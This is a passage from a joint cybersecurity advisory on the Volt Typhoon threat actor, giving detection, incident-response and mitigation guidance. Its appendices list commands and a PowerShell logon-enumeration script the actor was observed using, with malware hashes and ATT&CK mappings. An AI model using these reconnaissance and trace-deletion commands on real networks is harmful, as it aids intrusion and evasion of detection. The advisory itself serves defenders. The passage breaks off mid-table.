Configure intrusion detection systems (IDS) to create alarms for any ICS network traffic outside normal operations.
Track and monitor audit trails on critical areas of ICS.
Set up security incident and event monitoring (SIEM) to monitor, analyze, and correlate event logs from across the ICS network to identify intrusion attempts.

Review CISA’s Recommended Cybersecurity Practices for Industrial Control Systems and the joint advisory, NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational Technologies and Control Systems, for further OT system detection and mitigation guidance.
Use gait to Detect Possible Network Proxy Activities
Use gait[4] to detect network proxy activities. Developed by Sandia National Labs, gait is a publicly available Zeek[5] extension. The gait extension can help enrich Zeek’s network connection monitoring and SSL logs by including additional metadata in the logs. Specifically, gait captures unique TCP options and timing data such as a TCP, transport layer security (TLS), and Secure Shell (SSH) layer inferred round trip times (RTT), aiding in the identification of the software used by both endpoints and intermediaries.
While the gait extension for Zeek is an effective tool for enriching network monitoring logs with detailed metadata, it is not specifically designed to detect Volt Typhoon actor activities. The extension’s capabilities extend to general anomaly detection in network traffic, including—but not limited to—proxying activities. Therefore, while gait can be helpful in identifying tactics similar to those used by Volt Typhoon, such as proxy networks and FRP clients for C2 communication, not all proxying activities detected by using this additional metadata are necessarily indicative of Volt Typhoon presence. It serves as a valuable augmentation to current security stacks for a broader spectrum of threat detection.
For more information, see Sandia National Lab’s gait GitHub page sandialabs/gait: Zeek Extension to Collect Metadata for Profiling of Endpoints and Proxies.
Review Logins for Impossible Travel
Examine VPN or other account logon times, frequency, duration, and locations. Logons from two geographically distant locations within a short timeframe from a single user may indicate an account is being used maliciously. Logons of unusual frequency or duration may indicate a threat actor attempting to access a system repeatedly or maintain prolonged sessions for the purpose of data extraction.
Review Standard Directories for Unusual Files
Review directories, such as C:\windows\temp\ and C:\users\public\, for unexpected or unusual files. Monitor these temporary file storage directories for files typically located in standard system paths, such as the System32 directory. For example, Volt Typhoon has been observed downloading comsvcs.dll to a non-standard folder (this file is normally found in the System32 folder).
INCIDENT RESPONSE
If compromise, or potential compromise, is detected, organizations should assume full domain compromise because of Volt Typhoon’s known behavioral pattern of extracting the NTDS.dit from the DCs. Organizations should immediately implement the following immediate, defensive countermeasures:

Sever the enterprise network from the internet. Note: this step requires the agency to understand its internal and external connections. When making the decision to sever internet access, knowledge of connections must be combined with care to avoid disrupting critical functions.

If you cannot sever from the internet, shutdown all non-essential traffic between the affected enterprise network and the internet.


Reset credentials of privileged and non-privileged accounts within the trust boundary of each compromised account.

Reset passwords for all domain users and all local accounts, such as Guest, HelpAssistant, DefaultAccount, System, Administrator, and krbtgt. The krbtgt account is responsible for handling Kerberos ticket requests as well as encrypting and signing them. The krbtgt account should be reset twice because the account has a two-password history. The first account reset for the krbtgt needs to be allowed to replicate prior to the second reset to avoid any issues. See CISA’s Eviction Guidance for Networks Affected by the SolarWinds and Active Directory/M365 Compromise for more information. Although tailored to FCEB agencies compromised in the 2020 SolarWinds Orion supply chain compromise, the steps are applicable to organizations with Windows AD compromise.

Review access policies to temporarily revoke privileges/access for affected accounts/devices. If it is necessary to not alert the attacker (e.g., for intelligence purposes), then privileges can be reduced for affected accounts/devices to “contain” them.


Reset the relevant account credentials or access keys if the investigation finds the threat actor’s access is limited to non-elevated permissions.

Monitor related accounts, especially administrative accounts, for any further signs of unauthorized access.




Audit all network appliance and edge device configurations with indicators of malicious activity for signs of unauthorized or malicious configuration changes. Organizations should ensure they audit the current network device running configuration and any local configurations that could be loaded at boot time. If configuration changes are identified:

Change all credentials being used to manage network devices, to include keys and strings used to secure network device functions (SNMP strings/user credentials, IPsec/IKE preshared keys, routing secrets, TACACS/RADIUS secrets, RSA keys/certificates, etc.).
Update all firmware and software to the latest version.


Report the compromise to an authoring agency (see the Contact Information section).
For organizations with cloud or hybrid environments, apply best practices for identity and credential access management. 

Verify that all accounts with privileged role assignments are cloud native, not synced from Active Directory.
Audit conditional access policies to ensure Global Administrators and other highly privileged service principals and accounts are not exempted.
Audit privileged role assignments to ensure adherence to the principle of least privilege when assigning privileged roles.
Leverage just-in-time and just-enough access mechanisms when administrators need to elevate to a privileged role.
In hybrid environments, ensure federated systems (such as AD FS) are configured and monitored properly.
Audit Enterprise Applications for recently added applications and examine the API permissions assigned to each.


Reconnect to the internet. Note: The decision to reconnect to the internet depends on senior leadership’s confidence in the actions taken. It is possible—depending on the environment—that new information discovered during pre-eviction and eviction steps could add additional eviction tasks.
Minimize and control use of remote access tools and protocols by applying best practices from joint Guide to Securing Remote Access Software and joint Cybersecurity Information Sheet: Keeping PowerShell: Security Measures to Use and Embrace.
Consider sharing technical information with an authoring agency and/or a sector-specific information sharing and analysis center.

For more information on incident response and remediation, see:

Joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity. This advisory provides incident response best practices.
CISA’s Federal Government Cybersecurity Incident and Vulnerability Response Playbooks. Although tailored to U.S. Federal Civilian Executive Branch (FCEB) agencies, the playbooks are applicable to all organizations. The incident response playbook provides procedures to identify, coordinate, remediate, recover, and track successful mitigations from incidents.
Joint Water and Wastewater Sector - Incident Response Guide. This joint guide provides incident response best practices and information on federal resources for Water and Wastewater Systems Sector organizations.

MITIGATIONS
These mitigations are intended for IT administrators in critical infrastructure organizations. The authoring agencies recommend that software manufactures incorporate secure by design and default principles and tactics into their software development practices to strengthen the security posture for their customers.
For information on secure by design practices that may protect customers against common Volt Typhoon techniques, see joint guide Identifying and Mitigating Living off the Land Techniques and joint Secure by Design Alert Security Design Improvements for SOHO Device Manufacturers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
The authoring agencies recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of Volt Typhoon activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
IT Network Administrators and Defenders
Harden the Attack Surface

Apply patches for internet-facing systems within a risk-informed span of time [CPG 1E]. Prioritize patching critical assets, known exploited vulnerabilities, and vulnerabilities in appliances known to be frequently exploited by Volt Typhoon (e.g., Fortinet, Ivanti, NETGEAR, Citrix, and Cisco devices).
Apply vendor-provided or industry standard hardening guidance to strengthen software and system configurations. Note: As part of CISA’s Secure by Design campaign, CISA urges software manufacturers to prioritize secure by default configurations to eliminate the need for customer implementation of hardening guidelines.
Maintain and regularly update an inventory of all organizational IT assets [CPG 1A].
Use third party assessments to validate current system and network security compliance via security architecture reviews, penetration tests, bug bounties, attack surface management services, incident simulations, or table-top exercises (both announced and unannounced) [CPG 1F].
Limit internet exposure of systems when not necessary. An organization’s primary attack surface is the combination of the exposure of all its internet-facing systems. Decrease the attack surface by not exposing systems or management interfaces to the internet when not necessary.
Plan “end of life” for technology beyond manufacturer supported lifecycle. Inventories of organizational assets should be leveraged in patch and configuration management as noted above. Inventories will also enable identification of technology beyond the manufacturer’s supported lifecycle. Where technology is beyond “end of life” or “end of support,” additional cybersecurity vigilance is necessary, and may warrant one or more of the following:

Supplemental support agreements;
Additional scanning and testing;
Configuration changes;
Isolation;
Segmentation; and
Development of forward-looking plans to facilitate replacement.



Secure Credentials

Do not store credentials on edge appliances/devices. Ensure edge devices do not contain accounts that could provide domain admin access.
Do not store plaintext credentials on any system [CPG 2L]. Credentials should be stored securely—such as with a credential/password manager or vault, or other privileged account management solutions—so they can only be accessed by authenticated and authorized users.
Change default passwords [CPG 2A] and ensure they meet the policy requirements for complexity.
Implement and enforce an organizational system-enforced policy that:

Requires passwords for all IT password-protected assets to be at least 15 characters;
Does not allow users to reuse passwords for accounts, applications, services, etc., [CPG 2C]; and
Does not allow service accounts/machine accounts to reuse passwords from member user accounts.


Configure Group Policy settings to prevent web browsers from saving passwords and disable autofill functions.
Disable the storage of clear text passwords in LSASS memory.

Secure Accounts

Implement phishing-resistant MFA for access to assets [CPG 2H].
Separate user and privileged accounts.

User accounts should never have administrator or super-user privileges [CPG 2E].
Administrators should never use administrator accounts for actions and activities not associated with the administrator role (e.g., checking email, web browsing).


Enforce the principle of least privilege.

Ensure administrator accounts only have the minimum permissions necessary to complete their tasks.
Review account permissions for default/accounts for edge appliances/devices and remove domain administrator privileges, if identified.
Significantly limit the number of users with elevated privileges. Implement continuous monitoring for changes in group membership, especially in privileged groups, to detect and respond to unauthorized modifications.
Remove accounts from high-privilege groups like Enterprise Admins and Schema Admins. Temporarily reinstate these privileges only when necessary and under strict auditing to reduce the risk of privilege abuse.
Transition to Group Managed Service Accounts (gMSAs) where suitable for enhanced management and security of service account credentials. gMSAs provide automated password management and simplified Service Principal Name (SPN) management, enhancing security over traditional service accounts. See Microsoft’s Group Managed Service Accounts Overview.


Enforce strict policies via Group Policy and User Rights Assignments to limit high-privilege service accounts.
Consider using a privileged access management (PAM) solution to manage access to privileged accounts and resources [CPG 2L]. PAM solutions can also log and alert usage to detect any unusual activity.
Complement the PAM solution with role-based access control (RBAC) for tailored access based on job requirements. This ensures that elevated access is granted only when required and for a limited duration, minimizing the window of opportunity for abuse or exploitation of privileged credentials.
Implement an Active Directory tiering model to segregate administrative accounts based on their access level and associated risk. This approach reduces the potential impact of a compromised account. See Microsoft’s PAM environment tier model.
Harden administrative workstations to only permit administrative activities from workstations appropriately hardened based on the administrative tier. See Microsoft’s Why are privileged access devices important - Privileged access.
Disable all user accounts and access to organizational resources of employees on the day of their departure [CPG 2G]
Regularly audit all user, admin, and service accounts and remove or disable unused or unneeded accounts as applicable.
Regularly roll NTLM hashes of accounts that support token-based authentication.
Improve management of hybrid (cloud and on-premises) identity federation by:

Using cloud only administrators that are asynchronous with on-premises environments and ensuring on-premises administrators are asynchronous to the cloud.
Using CISA’s SCuBAGear tool to discover cloud misconfigurations in Microsoft cloud tenants. SCuBA gear is automation script for comparing Federal Civilian Executive Branch (FCEB) agency tenant configurations against CISA M365 baseline recommendations. SCuBAGear is part of CISA’s Secure Cloud Business Applications (SCuBA) project, which provides guidance for FCEB agencies, securing their cloud business application environments and protecting federal information created, accessed, shared, and stored in those environments. Although tailored to FCEB agencies, the project provides security guidance applicable to all organizations with cloud environments. For more information on SCuBAGear see CISA’s Secure Cloud Business Applications (SCuBA) Project.
Using endpoint detection and response capabilities to actively defend on-premises federation servers.



Secure Remote Access Services

Limit the use of RDP and other remote desktop services. If RDP is necessary, apply best practices, including auditing the network for systems using RDP, closing unused RDP ports, and logging RDP login attempts.
Disable Server Message Block (SMB) protocol version 1 and upgrade to version 3 (SMBv3) after mitigating existing dependencies (on existing systems or applications), as they may break when disabled.
Harden SMBv3 by implementing guidance included in joint #StopRansomware Guide (see page 8 of the guide).
Apply mitigations from the joint Guide to Securing Remote Access Software.

Secure Sensitive Data

Securely store sensitive data (including operational technology documentation, network diagrams, etc.), ensuring that only authenticated and authorized users can access the data.

Implement Network Segmentation

Ensure that sensitive accounts use their administrator credentials only on hardened, secure computers. This practice can reduce lateral movement exposure within networks.
Conduct comprehensive trust assessments to identify business-critical trusts and apply necessary controls to prevent unauthorized cross-forest/domain traversal.
Harden federated authentication by enabling Secure Identifier (SID) Filtering and Selective Authentication on AD trust relationships to further restrict unauthorized access across domain boundaries.
Implement network segmentation to isolate federation servers from other systems and limit allowed traffic to systems and protocols that require access in accordance with Zero Trust principles.

Secure Cloud Assets

Harden cloud assets in accordance with vendor-provided or industry standard hardening guidance.

Organizations with Microsoft cloud infrastructure, see CISA’s Microsoft 365 Security Configuration Baseline Guides, which provide minimum viable secure configuration baselines for Microsoft Defender for Office 365, Azure Active Directory (now known as Microsoft Entra ID), Exchange Online, OneDrive for Business, Power BI, Power Platform, SharePoint Online, and Teams. For additional guidance, see the Australian Signals Directorate’s Blueprint for Secure Cloud.
Organizations with Google cloud infrastructure, see CISA’s Google Workspace Security Configuration Baseline Guides, which provide minimum viable secure configuration baselines for Groups for Business, GMAIL, Google Calendar, Google Chat, Google Common Controls, Google Classroom, Google Drive and Docs, Google Meet, and Google Sites.


Revoke unnecessary public access to cloud environment. This involves reviewing and restricting public endpoints and ensuring that services like storage accounts, databases, and virtual machines are not publicly accessible unless absolutely necessary. Disable legacy authentication protocols across all cloud services and platforms. Legacy protocols frequently lack support for advanced security mechanisms such as multifactor authentication, rendering them susceptible to compromises. Instead, enforce the use of modern authentication protocols that support stronger security features like MFA, token-based authentication, and adaptive authentication measures.

Enforce this practice through the use of Conditional Access Policies. These policies can initially be run in report-only mode to identify potential impacts and plan mitigations before fully enforcing them. This approach allows organizations to systematically control access to their cloud resources, significantly reducing the risk of unauthorized access and potential compromise.


Regularly monitor and audit privileged cloud-based accounts, including service accounts, which are frequently abused to enable broad cloud resource access and persistence.

Be Prepared

Ensure logging is turned on for application, access, and security logs (e.g., intrusion detection systems/intrusion prevention systems, firewall, data loss prevention, and VPNs) [CPG 2T]. Given Volt Typhoon’s use of LOTL techniques and their significant dwell time, application event logs may be a valuable resource to hunt for Volt Typhoon activity because these logs typically remain on endpoints for relatively long periods of time.

For OT assets where logs are non-standard or not available, collect network traffic and communications between those assets and other assets.
Implement file integrity monitoring (FIM) tools to detect unauthorized changes.


Store logs in a central system, such as a security information and event management (SIEM) tool or central database.

Ensure the logs can only be accessed or modified by authorized and authenticated users [CPG 2U].
Store logs for a period informed by risk or pertinent regulatory guidelines.
Tune log alerting to reduce noise while ensuring there are alerts for high-risk activities. (For information on alert tuning, see joint guide Identifying and Mitigating Living Off the Land Techniques.)


Establish and continuously maintain a baseline of installed tools and software, account behavior, and network traffic. This way, network defenders can identify potential outliers, which may indicate malicious activity. Note: For information on establishing a baseline, see joint guide Identifying and Mitigating Living off the Land Techniques.
Document a list of threats and cyber actor TTPs relevant to your organization (e.g., based on industry or sectors), and maintain the ability (such as via rules, alerting, or commercial prevention and detection systems) to detect instances of those key threats [CPG 3A].
Implement periodic training for all employees and contractors that covers basic security concepts (such as phishing, business email compromise, basic operational security, password security, etc.), as well as fostering an internal culture of security and cyber awareness [CPG 2I].

Tailor the training to network IT personnel/administrators and other key staff based on relevant organizational cyber threats and TTPs, such as Volt Typhoon. For example, communicate that Volt Typhoon actors are known to target personal email accounts of IT staff, and encourage staff to protect their personal email accounts by using strong passwords and implementing MFA.
In addition to basic cybersecurity training, ensure personnel who maintain or secure OT as part of their regular duties receive OT-specific cybersecurity training on at least an annual basis [CPG 2J].
Educate users about the risks associated with storing unprotected passwords.



OT Administrators and Defenders

Change default passwords [CPG 2A] and ensure they meet the policy requirements for complexity. If the asset’s password cannot be changed, implement compensating controls for the device; for example, segment the device into separate enclaves and implement increased monitoring and logging.
Require that passwords for all OT password-protected assets be at least 15 characters, when technically feasible. In instances where minimum passwords lengths are not technically feasible (for example, assets in remote locations), apply compensating controls, record the controls, and log all login attempts. [CPG 2B].
Enforce strict access policies for accessing OT networks. Develop strict operating procedures for OT operators that details secure configuration and usage.
Segment OT assets from IT environments by [CPG 2F]:

Denying all connections to the OT network by default unless explicitly allowed (e.g., by IP address and port) for specific system functionality.
Requiring necessary communications paths between IT and OT networks to pass through an intermediary, such as a properly configured firewall, bastion host, “jump box,” or a demilitarized zone (DMZ), which is closely monitored, captures network logs, and only allows connections from approved assets.


Closely monitor all connections into OT networks for misuse, anomalous activity, or OT protocols.
Monitor for unauthorized controller change attempts. Implement integrity checks of controller process logic against a known good baseline. Ensure process controllers are prevented from remaining in remote program mode while in operation if possible.
Lock or limit set points in control processes to reduce the consequences of unauthorized controller access.
Be prepared by:

Determining your critical operational processes’ reliance on key IT infrastructure:

Maintain and regularly update an inventory of all organizational OT assets.
Understand and evaluate cyber risk on “as-operated” OT assets.
Create an accurate “as-operated” OT network map and identify OT and IT network inter-dependencies.


Identifying a resilience plan that addresses how to operate if you lose access to or control of the IT and/or OT environment.

Plan for how to continue operations if a control system is malfunctioning, inoperative, or actively acting contrary to the safe and reliable operation of the process.
Develop workarounds or manual controls to ensure ICS networks can be isolated if the connection to a compromised IT environment creates risk to the safe and reliable operation of OT processes.


Create and regularly exercise an incident response plan.

Regularly test manual controls so that critical functions can be kept running if OT networks need to be taken offline.


Implement regular data backup procedures on OT networks.

Regularly test backup procedures.




Follow risk-informed guidance in the joint advisory NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational Technologies and Control Systems, the NSA advisory Stop Malicious Cyber Activity Against Connected Operational Technology.

CONTACT INFORMATION
US organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact:

CISA’s 24/7 Operations Center at Report@cisa.gov or 1-844-Say-CISA (1-844-729-2472) or your local FBI field office. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov.
Water and Wastewater Systems Sector organizations, contact the EPA Water Infrastructure and Cyber Resilience Division at watercyberta@epa.gov to voluntarily provide situational awareness.
Entities required to report incidents to DOE should follow established reporting requirements, as appropriate. For other energy sector inquiries, contact EnergySRMA@hq.doe.gov.
For transportation entities regulated by TSA, report to CISA Central in accordance with the requirements found in applicable Security Directives, Security Programs, or TSA Order.

Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.
Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.
New Zealand organizations: Report cyber security incidents to incidents@ncsc.govt.nz or call 04 498 7654.
United Kingdom organizations: Report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hours) or, for urgent assistance, call 03000 200 973.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 5 through Table 17).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REFERENCES
[1] fofa[2] Microsoft: Volt Typhoon targets US critical infrastructure with living-off-the-land techniques[3] GitHub - fatedier/frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet[4] GitHub - sandialabs/gait: Zeek Extension to Collect Metadata for Profiling of Endpoints and Proxies[5] The Zeek Network Security Monitor
RESOURCES
Microsoft: Volt Typhoon targets US critical infrastructure with living-off-the-land techniquesSecureworks: Chinese Cyberespionage Group BRONZE SILHOUETTE Targets U.S. Government and Defense Organizations
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.
ACKNOWLEDGEMENTS
Fortinet and Microsoft contributed to this advisory.
VERSION HISTORY
February 7, 2024: Initial Version.March 7, 2024: Updated Mitigations section to add recommendation on “end of life” technology.
APPENDIX A: VOLT TYPHOON OBSERVED COMMANDS / LOTL ACTIVITY
See Table 2 and Table 3 for Volt Typhoon commands and PowerShell scripts observed by the U.S. authoring agencies during incident response activities. For additional commands used by Volt Typhoon, see joint advisory People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection.

Table 2: Volt Typhoon Observed Commands in PowerShell Console History


Command/Script
Description/Use




Get-EventLog security -instanceid 4624 -after {redacted date} | fl * | Out-File 'C:\users\public\documents\user.dat'  
PowerShell command extracts security log entries with the Event ID 4624 after a specified date. The output is formatted (fl *) and saved to user.dat. Potentially used to analyze logon patterns and identify potential targets for lateral movement.


Get-EventLog security -instanceid 4624 | Where-Object {$_.message.contains('{redacted user account}')} | select -First 1 | fl *  
PowerShell command extracts security log entries with the Event ID 4624 and filters them to include only those containing a specific user account, selecting the first instance of such an event.


wminc process get name,processid
Appears to be an attempt to use the wmic command but with a misspelling (wminc instead of wmic). This command, as it stands, would not execute successfully and would return an error in a typical Windows environment. This could indicate a mistake made during manual input.


wmic process get name,processid  
WMI command lists all running processes with process names and process IDs. Potentially used to find process IDs needed for other operations, like memory dumping.


tasklist /v  
Command displays detailed information about currently running processes, including the name, PID, session number, and memory usage.


taskkill /f /im rdpservice.exe
Command forcibly terminates the process rdpservice.exe. Potentially used as a cleanup activity post-exploitation.


ping -n 1 {redacted IP address}
Command sends one ICMP echo request to a specified IP address.


ping -n 1 -w 1 {redacted IP address}
Command sends one ICMP echo request to a specified IP address with a timeout (-w) of 1 millisecond.


net user
Lists all user accounts on the local machine or domain, useful for quickly viewing existing user accounts.



quser
 
query user

Displays information about user sessions on a system, aiding in identifying active users or sessions.


net start
Lists all active services.


cmd
Opens a new instance of the command prompt.


cd [Redacted Path]
Changes the current directory to a specified path, typically for navigating file systems.


Remove-Item .\Thumbs.db
PowerShell command to delete the Thumbs.db file, possibly for cleanup or removing traces.


move .\Thumbs.db ttt.dat
Relocates and renames the file Thumbs.db in the current directory to ttt.dat within the same directory.


del .\Thumbs.db /f /s /q
Force deletes Thumbs.db files from the current directory and all subdirectories, part of cleanup operations to erase traces.


del ??
Deletes files with two-character names, potentially a targeted cleanup command.


del /?
Displays help information for the del command.


exit
Terminates the command prompt session.


ipconfig
Retrieves network configuration details, helpful for discovery and mapping the victim's network.


net time /dom
Queries or sets the network time for a domain, potentially used for reconnaissance or to manipulate system time.


netstta -ano
Intended as netstat -ano; a mistyped command indicating a potential operational error.


netstat -ano
Lists active network connections and processes, helpful for identifying communication channels and potential targets.


type .\Notes.txt
Displays the contents of Notes.txt, possibly used for extracting specific information or intelligence gathering.


logoff
Logs off the current user session.




Table 3: Volt Typhoon Observed PowerShell Scripts


Script name and location
Contents
Description/Use




C:\{redacted}\logins.ps1

# Find DC list from Active Directory
$DCs = Get-ADDomainController -Filter *
 
# Define time for report (default is 1 day)
$startDate = (get-date).AddDays(-1)
 
# Store successful logon events from security logs with the specified dates and workstation/IP in an array
foreach ($DC in $DCs){
$slogonevents = Get-Eventlog -LogName Security -ComputerName $DC.Hostname -after $startDate | where {$_.eventID -eq 4624 }}
 
# Crawl through events; print all logon history with type, date/time, status, account name, computer and IP address if user logged on remotely
 
 foreach ($e in $slogonevents){
 # Logon Successful Events
 # Local (Logon Type 2)
 if (($e.EventID -eq 4624 ) -and ($e.ReplacementStrings[8] -eq 2)){
 write-host ""Type: Local Logon`tDate: ""$e.TimeGenerated ""`tStatus: Success`tUser: ""$e.ReplacementStrings[5] ""`tWorkstation: ""$e.ReplacementStrings[11]
 }
 # Remote (Logon Type 10)
 if (($e.EventID -eq 4624 ) -and ($e.ReplacementStrings[8] -eq 10)){
 write-host ""Type: Remote Logon`tDate: ""$e.TimeGenerated ""`tStatus: Success`tUser: ""$e.ReplacementStrings[5] ""`tWorkstation: ""$e.ReplacementStrings[11] ""`tIP Address: ""$e.ReplacementStrings[18]
 }}

The script is designed for user logon discovery in a Windows Active Directory environment. It retrieves a list of DCs and then queries security logs on these DCs for successful logon events (Event ID 4624) within the last day. The script differentiates between local (Logon Type 2) and remote (Logon Type 10) logon events. For each event, it extracts and displays details including the logon type, date/time of logon, status, account name, and the workstation or IP address used for the logon. Volt Typhoon may be leveraging this script to monitor user logon activities across the network, potentially to identify patterns, gather credentials, or track the movement of users and administrators within the network.



APPENDIX B: INDICATORS OF COMPROMISE
See Table 4 for Volt Typhoon IOCs obtained by the U.S. authoring agencies during incident response activities.
Note: See MAR-10448362-1.v1 for more information on this malware.

Table 4: Volt Typhoon Malicious Files and Associated Hashes


File Name
Description
MD5
Hashes (SHA256)




BrightmetricAgent.exe

The file is an FRP that could be used to reveal servers situated behind a network firewall or obscured through Network Address Translation (NAT).
 

fd41134e8ead1c18ccad27c62a260aa6
edc0c63065e88ec96197c8d7a40662a15a812a9583dc6c82b18ecd7e43b13b70


SMSvcService.exe
The file is a Windows executable ""FRPC” designed to open a reverse proxy between the compromised system and the threat actor(s) C2 server.
b1de37bf229890ac181bdef1ad8ee0c2
99b80c5ac352081a64129772ed5e1543d94cad708ba2adc46dc4ab7a0bd563f1



APPENDIX C: MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 5 through Table 17 for all referenced threat actor tactics and techniques in this advisory.

Table 5: Volt Typhoon actors ATT&CK Techniques for Enterprise – Reconnaissance


Reconnaissance
 
 


Technique Title
ID
Use




Gather Victim Host Information
T1592
Volt Typhoon conducts extensive pre-compromise reconnaissance. This includes web searches, including victim-owned sites, for victim host, identity, and network information, especially for information on key network and IT administrators.


Gather Victim Identity Information
T1589
Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization’s staff.


Gather Victim Identity Information: Email Addresses
T1589.002
Volt Typhoon targets the personal emails of key network and IT staff.


Gather Victim Network Information
T1590
Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization’s network.


Gather Victim Org Information
T1591
Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization.


Search Open Websites/Domains
T1593
Volt Typhoon conducts extensive pre-compromise reconnaissance. This includes web searches, including victim-owned sites, for victim host, identity, and network information, especially for information on key network and IT administrators.


Search Victim-Owned Websites
T1594
Volt Typhoon conducts extensive pre-compromise reconnaissance. This includes web searches, including victim-owned sites, for victim host, identity, and network information, especially for information on key network and IT administrators.




Table 6: Volt Typhoon actors ATT&CK Techniques for Enterprise – Resource Development


Resource Development
 
 


Technique Title
ID
Use




Acquire Infrastructure: Botnet
T1583.003
Volt Typhoon uses multi-hop proxies for command-and-control infrastructure. The proxy is typically composed of Virtual Private Servers (VPSs) or small office/home office (SOHO) routers.


Compromise Infrastructure: Botnet
T1584.005
Volt Typhoon used Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support their operations.


Compromise Infrastructure: Server
T1584.004
Volt Typhoon has redirected specific port traffic to their proxy infrastructure, effectively converting the PRTG’s Detection Guidance server into a proxy for their C2 traffic.


Develop Capabilities: Exploits
T1587.004
Volt Typhoon uses publicly available exploit code, but is also adept at discovering and exploiting vulnerabilities as zero days.


Obtain Capabilities: Exploits
T1588.005
Volt Typhoon uses publicly available exploit code, but is also adept at discovering and exploiting vulnerabilities as zero days.




Table 7: Volt Typhoon actors ATT&CK Techniques for Enterprise – Initial Access


Initial Access
 
 


Technique Title
ID
Use




Exploit Public-Facing Application
T1190
Volt Typhoon commonly exploits vulnerabilities in networking appliances such as Fortinet, Ivanti (formerly Pulse Secure), NETGEAR, Citrix, and Cisco.


External Remote Services
T1133
Volt Typhoon often uses VPN sessions to securely connect to victim environments, enabling discreet follow-on intrusion activities.




Table 8: Volt Typhoon actors ATT&CK Techniques for Enterprise – Execution


Execution
 
 


Technique Title
ID
Use




Command and Scripting Interpreter
T1059
Volt Typhoon uses hands-on-keyboard execution for their malicious activity via the command-line.


Command and Scripting Interpreter: PowerShell
T1059.001
Volt Typhoon has executed clients via PowerShell.


Command and Scripting Interpreter: Unix Shell
T1059.004
Volt Typhoon has used Brightmetricagent.exe, which contains multiplexer libraries that can bi-directionally stream data over through NAT networks and contains a command-line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management, Instrumentation (WMI), and Z Shell (zsh).


Windows Management Instrumentation
T1047
Volt Typhoon has used Windows Management Instrumentation Console (WMIC) commands.




Table 9: Volt Typhoon actors ATT&CK Techniques for Enterprise – Persistence


Persistence
 
 


Technique Title
ID
Use




Valid Accounts
T1078
Volt Typhoon primarily relies on valid credentials for persistence.




Table 10: Volt Typhoon actors ATT&CK Techniques for Enterprise – Privilege Escalation


Privilege Escalation
 
 


Technique Title
ID
Use




Exploitation for Privilege Escalation
T1068
Volt Typhoon first obtains credentials from public-facing appliances after gaining initial access by exploiting privilege escalation vulnerabilities in the operating system or network services.




Table 11: Volt Typhoon actors ATT&CK Techniques for Enterprise – Defense Evasion


Defense Evasion
 
 


Technique Title
ID
Use




Direct Volume Access
T1006
Volt Typhoon has executed the Windows-native vssadmin command to create a volume shadow copy.


Indicator Removal: Clear Persistence
T1070.009
Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity and masquerading file names.


Indicator Removal: Clear Windows Event Logs
T1070.001
Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity and masquerading file names.


Indicator Removal: File Deletion
T1070.004
Volt Typhoon created systeminfo.dat in C:\Users\Public\Documents, but subsequently deleted it.


Masquerading: Match Legitimate Name or Location
T1036.005
Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity and masquerading file names.


Modify Registry
T1112
Volt Typhoon has used the netsh command, a legitimate Windows command, to create a PortProxy registry modification on the PRTG server.


Obfuscated Files or Information: Software Packing
T1027.002
Volt Typhoon has obfuscated FRP client files (BrightmetricAgent.exe and SMSvcService.exe) and the command-line port scanning utility ScanLine by packing the files with Ultimate Packer for Executables (UPX).


System Binary Proxy Execution
T1218
Volt Typhoon uses hands-on-keyboard activity via the command-line and use other native tools and processes on systems (often referred to as “LOLBins”), known as LOTL, to maintain and expand access to the victim networks.




Table 12: Volt Typhoon actors ATT&CK Techniques for Enterprise – Credential Access


Credential Access
 
 


Technique Title
ID
Use




Brute Force: Password Cracking
T1110.002
Volt Typhoon has exfiltrated NTDS.dit and SYSTEM registry hive to crack passwords offline.


Credentials from Password Stores
T1555
Volt Typhoon has installed browsers saved passwords history, credit card details, and cookies.


Credentials from Password Stores: Credentials from Web Browsers
T1555.003
